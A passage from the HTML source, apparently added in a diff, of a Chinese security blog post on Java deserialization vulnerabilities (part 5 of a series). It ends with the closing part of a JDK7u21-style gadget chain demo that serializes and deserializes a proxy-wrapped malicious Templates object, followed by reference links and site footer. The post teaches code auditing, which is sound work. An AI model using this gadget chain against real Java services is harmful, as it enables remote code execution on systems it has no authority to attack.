+</span><span class="c1"></span>        <span class="n">Templates</span> <span class="n">proxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Templates</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">OriginalGadgetDemo</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">tempHandler</span><span class="o">);</span>
+
+        <span class="c1">// 实例化HashSet，并将两个对象放进去
+</span><span class="c1"></span>        <span class="n">HashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedHashSet</span><span class="o">();</span>
+        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
+        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">proxy</span><span class="o">);</span>
+
+        <span class="c1">// 将恶意templates设置到map中
+</span><span class="c1"></span>        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="n">templates</span><span class="o">);</span>
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">set</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="c1">// System.out.println(barr);
+</span><span class="c1"></span>        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">)</span><span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="参考">参考</h2>
+<p><a href="https://wx.zsxq.com/dweb2/index/group/2212251881" target="_blank" rel="noopener noreffer">phith0n Java 漫谈系列</a></p>
+<p><a href="https://xz.aliyun.com/t/6787#toc-11" target="_blank" rel="noopener noreffer">Java反序列化漏洞原理解析</a></p>
+<p><a href="https://www.freebuf.com/articles/web/271275.html" target="_blank" rel="noopener noreffer">Java反序列化漏洞从入门到关门</a></p>
+<p><a href="https://yinwc.github.io/2020/02/08/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/" target="_blank" rel="noopener noreffer">从0开始学Java反序列化漏洞</a></p>
+<p><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener noreffer">深入理解 JAVA 反序列化漏洞</a></p>
+<p><a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/" target="_blank" rel="noopener noreffer">Java反序列化利用链补全计划</a></p>
+<p><a href="https://wx.zsxq.com/dweb2/index/group/2212251881" target="_blank" rel="noopener noreffer">Commons-Collections 利用链分析</a></p>
+<p><a href="https://p2hm1n.com/2021/02/14/%e6%b7%b1%e5%85%a5-Java-%e5%8e%9f%e7%94%9f%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-JDK7u21-%e5%88%a9%e7%94%a8%e9%93%be%e5%88%86%e6%9e%90/" target="_blank" rel="noopener noreffer">深入 Java 原生反序列化 &amp; JDK7u21 利用链分析</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-09-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/" data-title="Java反序列化漏洞系列-5"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/" data-title="Java反序列化漏洞系列-5"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/" data-title="Java反序列化漏洞系列-5"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/" class="prev" rel="prev" title="Java反序列化漏洞系列-4"><i class="fas fa-angle-left fa-fw"></i>Java反序列化漏洞系列-4</a>
+            <a href="/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" class="next" rel="next" title="Webshell 内存马分析">Webshell 内存马分析<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
